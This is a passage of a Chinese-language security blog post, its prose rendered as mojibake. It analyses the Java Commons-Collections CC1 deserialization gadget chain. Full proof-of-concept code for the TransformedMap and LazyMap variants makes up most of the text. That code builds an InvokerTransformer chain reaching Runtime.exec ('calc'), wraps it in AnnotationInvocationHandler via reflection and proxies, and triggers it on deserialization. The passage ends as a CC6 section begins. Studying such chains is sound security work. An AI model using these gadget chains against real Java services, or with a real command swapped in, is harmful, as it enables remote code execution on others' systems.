class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>å¯¹äºé—®é¢˜äºŒï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå®Œç¾å®Œæˆä»»åŠ¡çš„ç±»ï¼š<strong>AnnotationInvocationHandler</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// sun.reflect.annotation.AnnotationInvocationHandler#readObject</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                        annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¡ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue =ã€‹<br>TransformedMap#checkSetValue =ã€‹ <br>valueTransformer.transform()<br></code></pre></td></tr></table></figure><p>checkSetValueä¼šå› ä¸ºMapè°ƒç”¨setValueæ–¹æ³•è€Œè°ƒç”¨checkSetValueæ–¹æ³•ï¼›</p><p>å› æ­¤è®©<code>memberValue</code>ä¸ºä¸Šé¢çš„evilMapå³å¯ã€‚</p><p>ä½†æ€ä¹ˆè§¦å‘åˆ°è¿™ä¸ªsetValueå‘¢ï¼Ÿ</p><p>åˆ¤æ–­æ¡ä»¶åœ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; memberType = memberTypes.get(name);<br></code></pre></td></tr></table></figure><p>å®ƒéœ€è¦æ»¡è¶³<code>memberType != null</code>æ‰èƒ½è¿›å…¥<code>memberValue.setValue</code></p><p>ç»§ç»­è·Ÿè¿›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br></code></pre></td></tr></table></figure><p>å†åˆ°annotationTypeï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">annotationType = AnnotationType.getInstance(type);<br></code></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br></code></pre></td></tr></table></figure><p>typeæ˜¯æ„é€ å¯¹è±¡æ—¶ä¼ è¿›æ¥çš„<code>Annotationå­ç±»</code>çš„<code>Class</code> </p><p>nameæ˜¯ä¼ å…¥Mapï¼ˆmemberValuesï¼‰çš„æ¯ä¸ªé”®å</p><p><code>memberType.get(name)</code>è¦ä¸ä¸ºç©º  å³è¦æ±‚<code>AnnotationType</code>è¦æœ‰åä¸º<code>name</code>çš„æˆå‘˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(AnnotationType.getInstance(Target.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class [Ljava.lang.annotation.ElementType;&#125;</span><br>System.out.println(AnnotationType.getInstance(Retention.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class java.lang.annotation.RetentionPolicy&#125;</span><br></code></pre></td></tr></table></figure><p>@Retentionå’Œ@Targetéƒ½æœ‰<code>value</code>è¿™ä¸ªæˆå‘˜</p><p>å¦å¤–ï¼Œ<code>AnnotationInvocationHandler</code>çš„æ„é€ æ–¹æ³•è¢«defaultä¿®é¥°ï¼Œä¸èƒ½ç›´æ¥newï¼Œè¦åˆ©ç”¨åå°„æ¥å®ä¾‹åŒ–è¯¥ç±»ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ°äº†<strong>CC1-TransformedMap-POC</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-number">114514</span>);<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">aih</span> <span class="hljs-operator">=</span> cons.newInstance(Target.class, evilMap);<br><br><span class="hljs-comment">// åºåˆ—åŒ–</span><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(aih);<br>oos.close();<br><br><span class="hljs-comment">// ååºåˆ—åŒ–</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>ois.close();<br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¸ªCC1é—®é¢˜å¾ˆå¤šï¼Œé¦–å…ˆæ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ä½œä¸ºCC1é“¾çš„å…¥å£ç±»ï¼Œ åœ¨<strong>Jdk8u71</strong>ä¹‹åè¢«ä¿®æ”¹äº†ï¼Œä¿®æ”¹åçš„<code>readObject</code>æ–¹æ³•ä¸­æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚</p><p>æ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„<code>LinkedHashMap</code>å¯¹è±¡ï¼Œè€ŒåŸæ¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„Mapä¸å†æ‰§è¡ŒsetValueæˆ–putæ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘RCEäº†ã€‚</p><p>æ¥ä¸‹æ¥å°±è¦å¼•å…¥<strong>CC1-LazyMap</strong>çš„æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ysoserialä¸­çš„æ–¹æ³•ã€‚</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>åˆ†æå®Œä¸Šé¢çš„é“¾å­å…¶å®å°±å¾ˆæ˜¾ç„¶ï¼ŒCCé“¾çš„å…³é”®åœ¨äº<code>transform()</code>çš„è§¦å‘,ä¸Šé¢é‚£æ¡<code>TransformedMap</code>çš„è§¦å‘åœ¨äºâ€œå¤–æ´â€<code>AnnotationInvocationHandler</code>çš„<code>readObject</code>è°ƒç”¨äº†<code>setValue</code>ï¼Œè¿›è€Œè§¦å‘<code>TransformedMap</code>çš„<code>checkSetValue</code>ï¼Œè¿›è€Œè§¦å‘<code>transform()</code></p><p>è€Œ<code>LazyMap</code>æ˜¯å¦ä¸€ä¸ªè§¦å‘ç‚¹å¤‡é€‰ï¼Œå› ä¸º<code>LazyMap</code>çš„<code>get</code>æ–¹æ³•ä¸­ä¼šæ‰§è¡Œ<code>factory.transform()</code>ï¼Œä¹Ÿæš—åˆâ€œæ‡’åŠ è½½â€çš„çœŸè°›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LazyMap</code>ç”±getè§¦å‘ï¼Œå¯¹æ¯”ä¸€ä¸‹å¯ä»¥å‘ç°ï¼š</p><ul><li>LazyMapï¼šgetå…ƒç´ æ—¶è§¦å‘</li><li>TransformedMapï¼šsetå…ƒç´ æ—¶è§¦å‘</li></ul><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>        <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>ChainedTransformer#transform()<br>ConstantTransformer#transform()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Class#getMethod()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#getRuntime()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#exec()<br></code></pre></td></tr></table></figure><p>ä¸å‰é¢åˆ†æçš„<code>TransformedMap</code>ä¸åŒï¼Œåœ¨<code>sun.reflect.annotation.AnnotationInvocationHandler</code>çš„<code>readObject</code>æ–¹æ³•ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ°Mapçš„getæ–¹æ³•ã€‚</p><p>ä½†æ˜¯ysoserialæ‰¾åˆ°äº†<code>AnnotationInvocationHandler</code>çš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>    <span class="hljs-comment">// Handle Object and Annotation methods</span><br>    <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>        paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>        <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>    <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>    &#125;<br><br>    <span class="hljs-comment">// Handle annotation member accessors</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>å®é™…æ˜¯ä¸ªä»£ç†ç±»ï¼Œå®ƒå®ç°äº†<code>InvocationHandler</code>æ¥å£ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦å®Œæˆï¼š</p><ol><li><code>readObject</code>ä¸­è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè°ƒç”¨è€…æ˜¯<code>AnnotationInvocationHandler</code>ä»£ç†å¯¹è±¡</li><li><code>AnnotationInvocationHandler</code>çš„<code>invoke</code>è§¦å‘<code>memberValues.get()</code> ï¼Œå› æ­¤ä»£ç†å¯¹è±¡çš„<code>memberValues</code>è¦è®¾ä¸º<code>LazyMap</code></li><li><code>LazyMap#get</code>è§¦å‘<code>factory.transform()</code></li></ol><p>é‚£ä¹ˆPOCä¹Ÿå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(argMap, chainedTransformer);<br><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class, evilMap);<br>    <span class="hljs-comment">// ä»£ç†å¯¹è±¡proxyMap</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br><br>    handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);<br><br><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>    oos.writeObject(handler);<br>    oos.close();<br><br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>POCä¸­è§¦å‘<code>invoke</code>çš„æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler#readObject =&gt; memberValues.entrySet()<br></code></pre></td></tr></table></figure><p>å› æ­¤<code>Proxy.newProxyInstance</code>ä¼ çš„æ˜¯<code>Map</code>çš„<code>ClassLoader</code>å’Œæ¥å£</p><p>ä½†æ˜¯ï¼Œ<code>LazyMap</code>çš„æ¼æ´è§¦å‘åœ¨getå’Œinvokeä¸­ è€Œ<code>TransformedMap</code>çš„æ¼æ´è§¦å‘åœ¨setValueä¸­ </p><p>åŒæ ·åœ¨ <strong>Jdk8u71</strong>ä¹‹åï¼Œç”±äº<code>AnnotationInvocationHandler</code>ä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„<code>LinkedHashMap</code>å¯¹è±¡ã€‚ å› æ­¤CC1é“¾åªå±€é™åœ¨<strong>Jdk8u71</strong>ä¹‹å‰çš„ç‰ˆæœ¬ã€‚æ‰€ä»¥è¿™é‡Œå¼¹ä¸å‡ºcalcï¼Œä½†æ˜¯åŸç†æ˜¯è¿™ä¹ˆä¸ªåŸç†ã€‚</p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>ä¸ºä»€ä¹ˆä¸æŒ‰é¡ºåºæ¥ï¼Œç¡®å®å› 